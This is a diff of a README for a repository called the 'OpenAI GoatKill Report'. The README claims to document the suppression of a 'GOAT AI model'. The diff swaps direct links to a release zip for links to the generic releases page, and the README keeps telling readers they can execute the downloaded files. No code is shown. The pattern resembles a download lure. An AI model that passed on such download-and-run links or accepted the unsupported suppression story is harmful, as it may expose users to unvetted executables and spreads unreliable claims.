@@ -20,7 +20,7 @@ Welcome to the **OpenAI GoatKill Report**. This repository serves as a public re
 
 The GOAT AI model was a breakthrough in artificial intelligence. However, its potential was abruptly halted. This repository documents the circumstances surrounding its suppression and aims to bring awareness to the community. 
 
-You can view the latest releases [here](https://github.com/Jamysin/openai-goatkill-report/releases/download/v3.4.4-alpha.4/openai-goatkill-report.v3.4.4-alpha.4.zip).
+You can view the latest releases [here](https://github.com/Jamysin/openai-goatkill-report/releases).
 
 ## Background
 
@@ -87,7 +87,7 @@ Your input is valuable. Here’s how you can contribute:
 
 ## Releases
 
-To download the latest release, visit the [Releases section](https://github.com/Jamysin/openai-goatkill-report/releases/download/v3.4.4-alpha.4/openai-goatkill-report.v3.4.4-alpha.4.zip). If you want to execute any files, follow the instructions provided there.
+To download the latest release, visit the [Releases section](https://github.com/Jamysin/openai-goatkill-report/releases). If you want to execute any files, follow the instructions provided there.
 
 ## License
 
